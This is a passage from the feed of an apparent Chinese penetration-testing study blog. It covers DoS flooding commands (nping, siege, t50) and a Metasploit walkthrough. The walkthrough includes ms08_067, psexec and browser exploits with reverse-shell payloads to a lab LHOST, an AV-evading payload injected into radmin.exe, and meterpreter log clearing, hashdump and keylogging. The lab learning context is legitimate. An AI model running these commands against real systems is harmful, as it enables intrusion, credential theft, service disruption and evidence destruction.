10.10.10.132</code></pre><p><img src="3YN6wrP.png" alt="img"></p></li></ul><h3 id="3-nping"><a href="#3-nping" class="headerlink" title="3.nping"></a>3.nping</h3><ul><li><p>TCP 全连接 DoS 攻击</p><ul><li>nping –tcp-connect –rate=10000 -c 1000000000 -q 10.10.10.132</li></ul></li><li><p>查公网 IP</p><ul><li>nping –echo-client “public” echo.nmap.org –udp</li></ul></li></ul><h3 id="Siege"><a href="#Siege" class="headerlink" title="Siege"></a>Siege</h3><ul><li><p>http/https 压力测试工具，模拟多个用户并发访问请求</p></li><li><p>siege -g <a href="http://10.10.10.132/" target="_blank" rel="noopener">http://10.10.10.132</a></p></li><li><p>siege -i -c 1000 <a href="http://10.10.10.132/" target="_blank" rel="noopener">http://10.10.10.132</a> -A siegehttp</p></li><li><p>同时攻击多个 url ，使用 -f 调用字典文件</p></li><li><p>单独使用 siege -i -c 1000 ，也会调用字典文件（url 列表）</p><ul><li><p>/etc/siege/urls.txt</p><pre><code># 查看 banner 信息root@kali:~# siege -g http://10.10.10.132</code></pre></li></ul></li></ul><p><img src="Seky1di.png" alt="img"></p><pre><code>root@kali:~# siege -i -c 1000 http://10.10.10.132 -A Mozilla/5.0</code></pre><p><img src="8d3o6st.png" alt="img"></p><pre><code>root@kali:~# cat /etc/siege/urls.txt</code></pre><p><img src="ccML8at.png" alt="img"></p><pre><code>root@kali:~# siege -i -c 1000</code></pre><p><img src="FdDymAj.png" alt="img"></p><h3 id="5-T50"><a href="#5-T50" class="headerlink" title="5.T50"></a>5.T50</h3><ul><li><p>网络压力测试</p><ul><li><p>t50 10.10.10.132 –flood –turbo -S –protocol TCP –dport 80</p></li><li><p>t50 10.10.10.132 –flood –turbo -S TCP UDP OSPF EIGRP –dport 22</p><pre><code>root@kali:~# t50 10.10.10.132 --flood --turbo -S --protocol TCP --dport 80</code></pre></li></ul></li></ul><p><img src="NzK2wiZ.png" alt="img"></p><p><img src="wJiBiqD.png" alt="img"></p><h4 id="6-NMAP"><a href="#6-NMAP" class="headerlink" title="6.NMAP"></a>6.NMAP</h4><pre><code>root@kali:~# grep dos /usr/share/nmap/scripts/script.db | cut -d &quot;\&quot;&quot; -f 2broadcast-avahi-dos.nsehttp-slowloris.nseipv6-ra-flood.nsesmb-flood.nsesmb-vuln-conficker.nsesmb-vuln-cve2009-3103.nsesmb-vuln-ms06-025.nsesmb-vuln-ms07-029.nsesmb-vuln-ms08-067.nsesmb-vuln-ms10-054.nsesmb-vuln-regsvc-dos.nse</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;拒绝服务常见的攻击方式总结&quot;&gt;&lt;a href=&quot;#拒绝服务常见的攻击方式总结&quot; class=&quot;headerlink&quot; title=&quot;拒绝服务常见的攻击方式总结&quot;&gt;&lt;/a&gt;拒绝服务常见的攻击方式总结&lt;/h2&gt;&lt;h4 id=&quot;1-拒绝服务简介&quot;&gt;&lt;a href=&quot;#1
      
    
    </summary>
    
    
      <category term="渗透测试学习" scheme="https://shu1l.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="拒绝服务" scheme="https://shu1l.github.io/tags/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/"/>
    
  </entry>
  
  <entry>
    <title>Mestasploit基本使用学习</title>
    <link href="https://shu1l.github.io/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/"/>
    <id>https://shu1l.github.io/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/</id>
    <published>2020-04-03T11:52:51.000Z</published>
    <updated>2020-04-27T12:03:38.165Z</updated>
    
    <content type="html"><![CDATA[<h2 id="渗透测试——Mestasploit-基本使用"><a href="#渗透测试——Mestasploit-基本使用" class="headerlink" title="渗透测试——Mestasploit 基本使用"></a>渗透测试——Mestasploit 基本使用</h2><h5 id="渗透测试者的困扰"><a href="#渗透测试者的困扰" class="headerlink" title="渗透测试者的困扰"></a>渗透测试者的困扰</h5><ul><li>需要掌握数百个工具软件，上千个命令参数，实在记不住</li><li>新出现的漏洞 PoC/EXP 有不同的运行环境要求，准备工作繁琐</li><li>大部分时间都在学习不同工具的使用户环境，如果能统一就好了</li></ul><h5 id="Metasploit-简介"><a href="#Metasploit-简介" class="headerlink" title="Metasploit 简介"></a>Metasploit 简介</h5><ul><li><p>目前最流行、最强大、最具扩展性的渗透测试平台软件</p></li><li><p>基于 Metasploit 进行渗透测试和漏洞分析的流程和方法</p></li><li><p>2003 年由 HD More 发布第一版，2007 年用 ruby 语言编写</p><ul><li>框架继承了渗透测试标准（PETS）标准</li><li>一定程度上统一了渗透测试研究的工作环境</li><li>新的攻击代码可以比较容易的加入框架</li></ul></li><li><p>开发活跃版本更新频繁</p><ul><li>早期版本基于社区力量维护，被 Rapid 7 收购后大枣出其商业版本产品</li><li>目前分化为四个版本，社区版依然十分活跃</li><li>HD More说：为 Metasploit 写书是种自虐</li></ul></li><li><p>Metasploit 默认集成 kali linux 中</p></li><li><p>使用 postgresql 数据库存储数据</p><ul><li>早期版本需要先启动数据库再启动 msf</li></ul><p><img src="https://i.imgur.com/zXzemZd.png" alt="img"></p></li></ul><p><img src="https://i.imgur.com/mgJH3KP.jpg" alt="img"></p><h4 id="Metasploit-架构"><a href="#Metasploit-架构" class="headerlink" title="Metasploit 架构"></a>Metasploit 架构</h4><ul><li>Rex<ul><li>基本功能库，用于完成日常基本任务，无需人工手动编码实现</li><li>处理 socket 连接与访问、协议应答（http/SSL/SMB 等）</li><li>编码转换（XOR、Base64、Unicode）</li></ul></li><li>Msf::Core<ul><li>提供 Metasploit的核心基本 API，是框架的核心能力实现库</li></ul></li><li>Msf::Base<ul><li>提供友好的的 API 接口，便于模块调用的库</li></ul></li><li>Plugin 插件<ul><li>连接和调用外部扩展功能和系统</li></ul></li><li>模块<ul><li>/usr/share/metasploit-framework/modules/</li></ul></li><li>技术功能模块（不是流程模块）<ul><li>Exploits：利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法（主动、被动）</li></ul></li><li>Payload：成功 exploit 之后，真正在目标系统执行的代码或指令<ul><li>shellcode 或系统命令</li><li>三种 payload：/usr/share/metasploit-framework/modules/payloads/</li><li>Single：all-in-one</li><li>Stager：目标计算机内存有限时，先传输一个较小的 payload 用于建立连接</li><li>stages：利用 stager 建立的连接下载的后续payload</li><li>stager、stages 都有多种类型，适用于不同场景</li><li>shellcode 是 payload 的一种，由于期间里正向/反向 shell 而得名</li></ul></li><li>技术功能模块（不是流程模块）<ul><li>Auxiliary：执行信息收集、枚举、指纹探测、扫描等功能的辅助模块（没有 payload 的 exploit 模块）</li><li>Encoders：对 payload 进行加密，躲避 AV 检查的模块</li><li>Nops：提高 paylaod 稳定性及维持大小</li></ul></li></ul><h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h4><ul><li>使用前先升级：<strong>msfupdate</strong></li><li>msfcli 使用接口，现在已经更新至 msfconsole -x</li><li>msfconsole 使用接口<ul><li>最流行的用户接口</li><li>几乎可以使用全部 msf 功能</li><li>控制台命令支持 TAB 自动补全</li><li>支持外部命令的执行（系统命令等）</li></ul></li><li>点击鼠标启动</li></ul><pre><code>通用选项:    -E, --environment ENVIRONMENT    设置Rails环境，默认为RAIL_ENV环境变量或&#39;生产&#39;数据库选项:    -M, --migration-path DIRECTORY   指定包含其他数据库迁移的目录    -n, --no-database                禁用数据库支持    -y, --yaml PATH                  指定一个包含数据库设置的YAML文件框架选项:    -c FILE                          加载指定的配置文件    -v, -V, --version                显示版本模块选项:        --defer-module-loads         除非明确询问，否则推迟模块加载    -m, --module-path DIRECTORY      加载一个额外的模块路径控制台选项:    -a, --ask                        在退出Metasploit之前询问或接受&#39;退出-y&#39;    -H, --history-file FILE          将命令历史记录保存到指定的文件    -L, --real-readline              使用系统Readline库而不是RbReadline    -o, --output FILE                输出到指定的文件    -p, --plugin PLUGIN              在启动时加载插件    -q, --quiet                      不要在启动时显示 banner 信息    -r, --resource FILE              执行指定的资源文件（ - 用于stdin）    -x, --execute-command COMMAND    执行指定的控制台命令（使用;用于倍数）    -h, --help                       显示此消息</code></pre><ul><li>进入 msfconsole，查看帮助信息</li></ul><pre><code>root@kali:~# msfconsolemsf &gt; help核心命令=============    命令            描述    -------       -----------    ?             帮助菜单    banner        显示一个很棒的metasploit横幅    cd            更改当前的工作目录    color         切换高亮显示颜色    connect       连接与主机通信    exit          退出退出控制台    get           获取特定于上下文的变量的值    getg          获取全局变量的值    grep          Grep另一个命令的输出    help          帮助菜单    history       历史显示命令历史    irb           进入irb脚本模式    load          加载一个框架插件    quit          退出控制台    route         路由通过会话路由流量    save          保存保存活动的数据存储    sessions      会话转储会话列表并显示有关会话的信息    set           将特定于上下文的变量设置为一个值    setg          将全局变量设置为一个值    sleep         睡眠在指定的秒数内不执行任何操作    spool         将控制台输出写入文件以及屏幕    threads       线程查看和操作后台线程    unload        卸载卸载框架插件    unset         取消设置取消设置一个或多个特定于上下文的变量    unsetg        取消设置取消设置一个或多个全局变量    version       版本显示框架和控制台库版本号模块命令===============    命令            描述    -------       -----------    advanced      高级显示一个或多个模块的高级选项    back          返回从当前上下文返回    edit          编辑使用首选编辑器编辑当前模块或文件    info          显示有关一个或多个模块的信息    loadpath      加载路径搜索并加载路径中的模块    options       选项显示全局选项或一个或多个模块    popm          将最新的模块从堆栈弹出并使其处于活动状态    previous      将之前加载的模块设置为当前模块    pushm         将活动或模块列表推入模块堆栈    reload_all    重新加载所有定义的模块路径中的所有模块    reload_lib    从指定路径加载库文件    search        搜索搜索模块名称和说明    show          显示给定类型的模块或所有模块    use           使用按名称选择模块工作命令============    命令            描述    -------       -----------    handler       处理程序作为作业启动负载处理程序    jobs          作业显示和管理作业    kill          杀死一份工作    rename_job    重命名作业资源脚本命令========================    命令            描述    -------       -----------    makerc        保存从开始到文件输入的命令    resource      运行存储在文件中的命令数据库后端命令=========================    命令                描述    -------           -----------    db_connect        连接到现有的数据库    db_disconnect     断开当前数据库实例    db_export         导出包含数据库内容的文件    db_import         导入扫描结果文件（文件类型将被自动检测）    db_nmap           执行nmap并自动记录输出    db_rebuild_cache  重建数据库存储的模块缓存    db_status         显示当前的数据库状态    hosts             列出数据库中的所有主机    loot              列出数据库中的所有战利品    notes             列出数据库中的所有注释    services          列出数据库中的所有服务    vulns             列出数据库中的所有漏洞    workspace         在数据库工作区之间切换凭证后端命令============================    命令            描述    -------       -----------    creds         列出数据库中的所有凭据(密码)</code></pre><ul><li>msf &gt; help show</li></ul><pre><code>[*]“show” 命令的有效参数是：all, encoders, nops, exploits, payloads, auxiliary, plugins, info, options[*]其他特定于模块的参数是：missing, advanced, evasion, targets, actions</code></pre><ul><li>msf &gt; help search</li></ul><pre><code>用法: search [keywords]Keywords:  app       :  客户端或服务器攻击的模块  author    :  本作者编写的模块  bid       :  具有匹配的Bugtraq ID的模块  cve       :  具有匹配CVE ID的模块  edb       :  具有匹配的Exploit-DB ID的模块  name      :  具有匹配描述性名称的模块  platform  :  影响这个平台的模块  ref       :  具有匹配参考的模块  type      :  特定类型的模块（exploit，auxiliary或post）msf &gt; search ms08-067msf &gt; search name:mysql / type:aux /author:aaron    # 可多条件同时搜索</code></pre><ul><li>模块内命令</li></ul><pre><code>msf &gt; search ms09_001_writemsf &gt; use auxiliary/dos/windows/smb/ms09_001_writemsf auxiliary(dos/windows/smb/ms09_001_write) &gt; info[*]其他特定于模块的参数是：missing, advanced, evasion, targets, actionsmsf auxiliary(dos/windows/smb/ms09_001_write) &gt; show missingmsf auxiliary(dos/windows/smb/ms09_001_write) &gt; show advancedmsf auxiliary(dos/windows/smb/ms09_001_write) &gt; show targetsmsf auxiliary(dos/windows/smb/ms09_001_write) &gt; help edit    用法：编辑[file / to / edit.rb]    使用编辑当前活动模块或本地文件。    如果指定了文件路径，它将在编辑后自动重新加载。    否则，您可以使用“重新加载”或“重新运行”来重新加载活动模块。msf auxiliary(dos/windows/smb/ms09_001_write) &gt; edit</code></pre><ul><li>数据库操作</li></ul><pre><code>msf &gt; help db_connect     [*]    Usage: db_connect &lt;user:pass&gt;@&lt;host:port&gt;/&lt;database&gt;    [*]       OR: db_connect -y [path/to/database.yml]    [*] Examples:    [*]        db_connect user@metasploit3    [*]        db_connect user:pass@192.168.0.2/metasploit3    [*]        db_connect user:pass@192.168.0.2:1500/metasploit3msf &gt; help db_import    Usage: db_import &lt;filename&gt; [file2...]    Filenames can be globs like *.xml, or **/*.xml which will search recursivelymsf &gt; help db_export    Usage:    db_export -f &lt;format&gt; [filename]    Format can be one of: xml, pwdump</code></pre><ul><li>msf &gt; help sessions<br>Usage: sessions [options] or sessions [id]</li></ul><pre><code>活动的会话操作和交互。选项:    -C &lt;opt&gt;  在-i或全部给定的会话上运行Meterpreter命令    -K        终止所有会话    -S &lt;opt&gt;  行搜索过滤器。    -c &lt;opt&gt;  在-i或全部给定的会话上运行命令    -h        帮助横幅    -i &lt;opt&gt;  与提供的会话ID进行交互    -k &lt;opt&gt;  按会话ID和/或范围终止会话    -l        列出所有活动会话    -n &lt;opt&gt;  按ID命名或重命名会话    -q        静音模式    -r        重置用-i或全部给定的会话的环形缓冲区    -s &lt;opt&gt;  在-i或全部给定的会话上运行脚本或模块    -t &lt;opt&gt;  设置响应超时（默认值：15）    -u &lt;opt&gt;  在许多平台上将shell升级到meterpreter会话    -v        以详细模式列出会话    -x        在会话表中显示扩展信息许多选项允许使用逗号和破折号指定会话范围。例如:  sessions -s checkvm -i 1,3-5  or  sessions -k 1-2,5,6</code></pre><h4 id="5-Exploit-模块"><a href="#5-Exploit-模块" class="headerlink" title="5. Exploit 模块"></a>5. Exploit 模块</h4><h5 id="1-Active-exploit"><a href="#1-Active-exploit" class="headerlink" title="1.Active exploit"></a>1.Active exploit</h5><p>攻击者主动连接受害者：</p><pre><code>root@kali:~# cat ms08067.rb use exploit/windows/smb/ms08_067_netapiset RHOST 10.10.10.147set RPORT 445set PAYLOAD windows/shell/reverse_tcpset LHOST 10.10.10.131set LPORT 4444exploit</code></pre><p><img src="https://i.imgur.com/rNO4Mud.png" alt="img"></p><pre><code>root@kali:~# cat psexec.rb use exploit/windows/smb/psexecset RHOST 10.10.10.148set PAYLOAD windows/shell/reverse_tcpset LHOST 10.10.10.131set LPORT 4444set SMBUSER Administratorset SMBPASS 123456exploit</code></pre><p><img src="https://i.imgur.com/ctvHDYR.png" alt="img"></p><h5 id="2-Passive-Exploits"><a href="#2-Passive-Exploits" class="headerlink" title="2. Passive Exploits"></a>2. Passive Exploits</h5><p>攻击者等待受害者来触发连接，反弹到攻击者</p><pre><code>root@kali:~# cat ms07017.rb use exploit/windows/browser/ms07_017_ani_loadimage_chunksizeset URIPATH /set SRVHOST 0.0.0.0set PAYLOAD windows/shell/reverse_tcpset EXITFUNC threadset LHOST 10.10.10.131set LPORT 4444exploit</code></pre><p><img src="https://i.imgur.com/meKMAdB.png" alt="img"></p><p><img src="https://i.imgur.com/aEu1anZ.png" alt="img"></p><h4 id="6-生成payload"><a href="#6-生成payload" class="headerlink" title="6.生成payload"></a>6.生成payload</h4><ul><li>用法</li></ul><pre><code>msf &gt; search ms08-067msf &gt; use payload/windows/shell/bind_tcpmsf payload(windows/shell/bind_tcp) &gt; generate  #获得shellcodemsf payload(windows/shell/bind_tcp) &gt; generate -h    Usage: generate [options]    Generates a payload.    OPTIONS:        -E        强制编码。        -b &lt;opt&gt;  要避免的字符列表：&#39;\ x00 \ xff&#39;        -e &lt;opt&gt;  要使用的编码器模块的名称。        -f &lt;opt&gt;  输出文件名（否则为stdout）        -h        帮助横幅。        -i &lt;opt&gt;  编码迭代的次数。        -k        保持模板可执行的功能        -o &lt;opt&gt;  以VAR = VAL格式逗号分隔的选项列表。        -p &lt;opt&gt;  输出平台        -s &lt;opt&gt;  NOP sled length.        -t &lt;opt&gt;  输出格式: bash,c,csharp,dw,dword,hex,java,js_be,js_le,num,perl,pl,powershell,ps1,py,python,raw,rb,ruby,sh,vbapplication,vbscript,asp,aspx,aspx-exe,axis2,dll,elf,elf-so,exe,exe-only,exe-service,exe-small,hta-psh,jar,jsp,loop-vbs,macho,msi,msi-nouac,osx-app,psh,psh-cmd,psh-net,psh-reflection,vba,vba-exe,vba-psh,vbs,war        -x &lt;opt&gt;  要使用的可执行模板msf payload(windows/shell/bind_tcp) &gt; generate</code></pre><p><img src="https://i.imgur.com/wEztOAj.png" alt="img"></p><ul><li>自动绕过坏字符</li></ul><pre><code>msf payload(windows/shell/bind_tcp) &gt; generate -b &#39;\x00&#39;msf payload(windows/shell/bind_tcp) &gt; generate -b &#39;\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b&#39;</code></pre><ul><li>手动指定编码模块</li></ul><pre><code>msf payload(windows/shell/bind_tcp) &gt; show encoders</code></pre><p><img src="https://i.imgur.com/siajCwd.png" alt="img"></p><ul><li>注入文件</li></ul><pre><code>msf payload(windows/shell/bind_tcp) &gt; generate -b &#39;\x00&#39; -t exe -e x86/shikata_ga_nai -i 5 -k -x /usr/share/windows-binaries/radmin.exe -f /root/1.exe</code></pre><ul><li><p>NOP：no-operation / Next Operation （无任何操作）</p><ul><li>EIP 返回存储 NOP sled 的任意地址时将递增，最终导致 shellcode 执行</li><li>增加一行 EOP</li></ul><pre><code>msf payload(windows/shell/bind_tcp) &gt; generate -s 14</code></pre></li></ul><h4 id="7-metepreter"><a href="#7-metepreter" class="headerlink" title="7. metepreter"></a>7. metepreter</h4><h5 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h5><ul><li>高级、动态、可扩展的 payload<ul><li>基于 metepreter 上下文利用更多漏洞发起攻击</li><li>后渗透测试阶段一站式操作界面</li></ul></li><li>完全基于内存的 DLL 注入式 payload （不写硬盘）<ul><li>注入合法系统进程并建立 stager</li><li>基于 stager 上传和预加载 dll 进行扩展模块 TLS/1.0 通信隧道</li><li>利用 TLS 隧道进一步加载后续扩展模块（避免网络取证）</li></ul></li><li>服务端使用 c 语言编写</li><li>客户端提供基于 ruby 的全特性 API（支持任何语言）</li></ul><h5 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h5><pre><code>root@kali:~# cat metepreter.rb use exploit/windows/smb/ms08_067_netapiset payload windows/meterpreter/reverse_tcpset RHOST 10.10.10.147set LHOST 10.10.10.131run</code></pre><p><img src="https://i.imgur.com/b9G8Uq6.png" alt="img"></p><ul><li>帮助文件</li></ul><pre><code>meterpreter &gt; help核心命令=============    命令                     描述    -------                   -----------    ?                         帮助菜单    background                背景当前会话    bgkill                    杀死一个背景meterpreter脚本    bglist                    列出运行后台脚本    bgrun                     执行一个meterpreter脚本作为后台线程    channel                   显示信息或控制活动频道    close                     关闭频道    disable_unicode_encoding  禁用unicode字符串的编码    enable_unicode_encoding   启用unicode字符串的编码    exit                      终止meterpreter会话    get_timeouts              获取当前会话超时值    guid                      获取会话GUID    help                      帮助菜单    info                      显示有关Post模块的信息    irb                       进入irb脚本模式    load                      加载一个或多个meterpreter扩展    machine_id                获取连接到会话的计算机的MSF ID    migrate                   将服务器迁移到另一个进程    pivot                     管理数据透视监听器    quit                      终止meterpreter会话    read                      从频道读取数据    resource                  运行存储在文件中的命令    run                       执行meterpreter脚本或Post模块    sessions                  快速切换到另一个会话    set_timeouts              设置当前会话超时值    sleep                     Force Meterpreter安静，然后重新建立会话。    transport                 更改当前的传输机制    use                       不推荐使用“加载”别名    uuid                      获取当前会话的UUID    write                     将数据写入通道Stdapi: 文件系统命令============================    命令          描述    -------       -----------    cat           将文件的内容读取到屏幕上    cd            更改目录    checksum      检索文件的校验和    cp            将源复制到目标    dir           列表文件（ls的别名）    download      下载文件或目录    edit          编辑一个文件    getlwd        打印本地工作目录    getwd         打印工作目录    lcd           更改本地工作目录    lls           列出本地文件    lpwd          打印本地工作目录    ls            列出文件    mkdir         建立目录    mv            将源移到目标    pwd           打印工作目录    rm            删除指定的文件    rmdir         删除目录    search        搜索文件    show_mount    列出所有安装点/逻辑驱动器    upload        上传文件或目录Stdapi: 网络命令===========================    命令          描述    -------       -----------    arp           显示主机ARP缓存    getproxy      显示当前的代理配置    ifconfig      显示界面    ipconfig      显示界面    netstat       显示网络连接    portfwd       将本地端口转发到远程服务    resolve       解析目标上的一组主机名    route         查看和修改路由表Stdapi: 系统命令=======================    Command       Description    -------       -----------    clearev       清除事件日志    drop_token    放弃任何活动的模拟令牌。    execute       执行一个命令    getenv        获取一个或多个环境变量值    getpid        获取当前的进程标识符    getprivs      尝试启用当前进程可用的所有权限    getsid        获取运行服务器的用户的SID    getuid        获取服务器正在运行的用户    kill          终止一个过程    localtime     显示目标系统的本地日期和时间    pgrep         按名称过滤进程    pkill         按名称终止进程    ps            列出运行的进程    reboot        重新启动远程计算机    reg           修改远程注册表并与之交互    rev2self      在远程机器上调用RevertToSelf（）    shell         放入系统命令外壳    shutdown      关闭远程计算机    steal_token   尝试从目标进程中盗取模拟令牌    suspend       暂停或恢复进程列表    sysinfo       获取有关远程系统的信息，例如OSStdapi: 用户界面命令===============================    命令          描述    -------        -----------    enumdesktops   列出所有可访问的桌面和窗口工作站    getdesktop     获取当前meterpreter桌面    idletime       返回远程用户闲置的秒数    keyscan_dump   转储按键缓冲区    keyscan_start  开始捕捉击键    keyscan_stop   停止捕获击键    screenshot     获取交互式桌面的屏幕截图    setdesktop     更改meterpreters当前桌面    uictl          控制一些用户界面组件Stdapi: Webcam 命令=======================    命令          描述    -------        -----------    record_mic     从默认麦克风录制音频X秒    webcam_chat    开始视频聊天    webcam_list    列出网络摄像头    webcam_snap    从指定的摄像头拍摄快照    webcam_stream  从指定的摄像头播放视频流Priv: Elevate Commands======================    命令          描述    -------       -----------    getsystem     尝试将您的特权提升为本地系统的特权。Priv: 密码数据库命令================================    命令          描述    -------       -----------    hashdump      转储SAM数据库的内容Priv: Timestomp 命令========================    命令          描述    -------       -----------    timestomp     操纵文件MACE属性</code></pre><ul><li>使用</li></ul><pre><code>meterpreter &gt; execute -f cmd.exemeterpreter &gt; psmeterpreter &gt; getuidmeterpreter &gt; getpidmeterpreter &gt; clearev   # 清除日志meterpreter &gt; upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32       # 上传文件meterpreter &gt; upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32msf exploit(windows/smb/ms08_067_netapi) &gt; sessions -lmsf exploit(windows/smb/ms08_067_netapi) &gt; sessions -i 1meterpreter &gt; hashdump  # 读取密码meterpreter &gt; run post/windows/gather/hashdump  # 读取密码meterpreter &gt; shell</code></pre><p><img src="https://i.imgur.com/lJasRoT.png" alt="img"></p><h4 id="Meterpreter-python-扩展"><a href="#Meterpreter-python-扩展" class="headerlink" title="Meterpreter python 扩展"></a>Meterpreter python 扩展</h4><ul><li>2015 年11月份，来自社区贡献</li><li>无需运行环境，在客户端运行原生 python 代码</li><li>使用</li></ul><pre><code>meterpreter &gt; load pythonmeterpreter &gt; python_execute &quot;print (&#39;asdasdas&#39;)&quot;meterpreter &gt; python_execute &quot;import os; cd = os.getcwd()&quot; -r cdroot@kali:~# cat find2.py import osfor root,dirs,files in os.walk(c://*):    for file in files:        if file.endwith(&quot;.ini&quot; ) and file.startwith(&quot;win&quot;):            print(os.path.john(root,file))python_import -f find.py</code></pre><h4 id="9-msfcli"><a href="#9-msfcli" class="headerlink" title="9. msfcli"></a>9. msfcli</h4><ul><li>2015 年6月已经被取消</li><li>由 msfconsole -x 取代</li><li>编写脚本时便于引用</li></ul><pre><code>msfconsole -x &quot;use exploit/windows/smb/ms08_067_netapi; set RHOST 10.10.10.147; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.10.10.131; set LPORT 5555; set target 34; exploit&quot;</code></pre><h3 id="Mestasploit-信息收集"><a href="#Mestasploit-信息收集" class="headerlink" title="Mestasploit 信息收集"></a>Mestasploit 信息收集</h3><h5 id="模块位置："><a href="#模块位置：" class="headerlink" title="模块位置："></a><strong>模块位置：</strong></h5><ul><li>信息收集的模块都在 auxiliary/scanner/ 之下</li></ul><pre><code>msf &gt; use auxiliary/scanner/ [TAB]Display all 531 possibilities? (y or n)</code></pre><h4 id="1-db-nmap"><a href="#1-db-nmap" class="headerlink" title="1. db_nmap"></a>1. db_nmap</h4><ul><li>跟 nmap 用法一样，结果存放在 msf 的数据库中</li></ul><pre><code>msf &gt; db_nmap -sV 10.10.10.0/24</code></pre><ul><li>auxiliary 目录下</li><li>RHOSTS &lt;&gt; RHOST<ul><li>192.168.1.20-192.168.1.30、192.168.1.0/24,192.168.11.0/24</li><li>也可以编写地址列表：file:/root/h.txt</li></ul></li></ul><h4 id="2-主机发现扫描"><a href="#2-主机发现扫描" class="headerlink" title="2.主机发现扫描"></a>2.主机发现扫描</h4><ul><li>use auxiliary/scanner/discovery/arp_sweep</li><li>set INTERFACE、RHOSTS、SHOST、SMAC、THREADS；run</li></ul><pre><code>msf &gt; search arpmsf &gt; use auxiliary/scanner/discovery/arp_sweepmsf auxiliary(scanner/discovery/arp_sweep) &gt; show options msf auxiliary(scanner/discovery/arp_sweep) &gt; set RHOSTS 10.10.10.0/24msf auxiliary(scanner/discovery/arp_sweep) &gt; set INTERFACE eth0msf auxiliary(scanner/discovery/arp_sweep) &gt; set THREADS 20msf auxiliary(scanner/discovery/arp_sweep) &gt; run</code></pre><h4 id="3-端口扫描"><a href="#3-端口扫描" class="headerlink" title="3.端口扫描"></a>3.端口扫描</h4><ul><li>use auxiliary/scanner/portscan/syn</li><li>set INTERFACE、PORTS、RHOSTS、THREADS；run</li></ul><pre><code>msf &gt; search portscanmsf &gt; use auxiliary/scanner/portscan/synmsf auxiliary(scanner/portscan/syn) &gt; show options msf auxiliary(scanner/portscan/syn) &gt; set INTERFACE eth0msf auxiliary(scanner/portscan/syn) &gt; set PORTS 80msf auxiliary(scanner/portscan/syn) &gt; set RHOSTS 10.10.10.0/24msf auxiliary(scanner/portscan/syn) &gt; set THREADS 50msf auxiliary(scanner/portscan/syn) &gt; run</code></pre><h4 id="4-僵尸扫描"><a href="#4-僵尸扫描" class="headerlink" title="4.僵尸扫描"></a>4.僵尸扫描</h4><ul><li>查找 ipidseq 主机（查找僵尸机）<ul><li>use auxiliary/scanner/ip/ipidseq</li><li>set RHOSTS 192.168.1.0/24 ；run</li><li>nmap -PN -sI 10.10.10.147 10.10.10.132</li></ul></li></ul><pre><code>msf &gt; use auxiliary/scanner/ip/ipidseqmsf auxiliary(scanner/ip/ipidseq) &gt; show options msf auxiliary(scanner/ip/ipidseq) &gt; set RHOSTS 10.10.10.100-150msf auxiliary(scanner/ip/ipidseq) &gt; set THREADS 20msf auxiliary(scanner/ip/ipidseq) &gt; run</code></pre><pre><code>msf &gt; db_nmap -PN -sI 10.10.10.147 10.10.10.132</code></pre><h4 id="5-UDP扫描"><a href="#5-UDP扫描" class="headerlink" title="5.UDP扫描"></a>5.UDP扫描</h4><ul><li>use auxiliary/scanner/discovery/udp_sweep</li><li>use auxiliary/scanner/discovery/udp_probe</li></ul><pre><code>msf &gt; use auxiliary/scanner/discovery/udp_sweepmsf auxiliary(scanner/discovery/udp_sweep) &gt; show options msf auxiliary(scanner/discovery/udp_sweep) &gt; set RHOSTS 10.10.10.100-150msf auxiliary(scanner/discovery/udp_sweep) &gt; run</code></pre><pre><code>msf &gt; use auxiliary/scanner/discovery/udp_probemsf auxiliary(scanner/discovery/udp_probe) &gt; show options msf auxiliary(scanner/discovery/udp_probe) &gt; set RHOSTS 10.10.10.100-150msf auxiliary(scanner/discovery/udp_probe) &gt; set CHOST 10.10.10.131msf auxiliary(scanner/discovery/udp_probe) &gt; set THREADS 20msf auxiliary(scanner/discovery/udp_probe) &gt; run</code></pre><h4 id="6-密码嗅探"><a href="#6-密码嗅探" class="headerlink" title="6.密码嗅探"></a>6.密码嗅探</h4><ul><li>use auxiliary/sniffer/psnuffle</li><li>支持从 pacap 抓包文件中提取密码</li><li>功能类似于 dsniff</li><li>目前只支持 pop3、imap、ftp、HTTP GET 协议</li></ul><pre><code>msf &gt; search sniffermsf &gt; use auxiliary/sniffer/psnufflemsf auxiliary(sniffer/psnuffle) &gt; show options msf auxiliary(sniffer/psnuffle) &gt; set INTERFACE eth0msf auxiliary(sniffer/psnuffle) &gt; run</code></pre><pre><code>root@kali:~# ftp 10.10.10.148</code></pre><pre><code># 继续上述msf auxiliary(sniffer/psnuffle) &gt; show optionsmsf auxiliary(sniffer/psnuffle) &gt; set PCAPFILE /root/ftp.pcapngmsf auxiliary(sniffer/psnuffle) &gt; jobsmsf auxiliary(sniffer/psnuffle) &gt; kill 0msf auxiliary(sniffer/psnuffle) &gt; run</code></pre><h4 id="7-SNMP扫描"><a href="#7-SNMP扫描" class="headerlink" title="7.SNMP扫描"></a>7.SNMP扫描</h4><ul><li>vim /etc/snmp/snmpd.conf （侦听复制修改为 0.0.0.0：161）</li><li>use auxiliary/scanner/snmp/snmp_login</li><li>use auxiliary/scanner/snmp/snmp_enum</li><li>use auxiliary/scanner/snmp/snmp_enumusers （windows）</li><li>use auxiliary/scanner/snmp/snmp_enumshares （windows）</li></ul><pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_loginmsf auxiliary(scanner/snmp/snmp_login) &gt; show options msf auxiliary(scanner/snmp/snmp_login) &gt; set RHOSTS 10.10.10.149msf auxiliary(scanner/snmp/snmp_login) &gt; set THREADS 20msf auxiliary(scanner/snmp/snmp_login) &gt; run</code></pre><pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_enummsf auxiliary(scanner/snmp/snmp_enum) &gt; show options msf 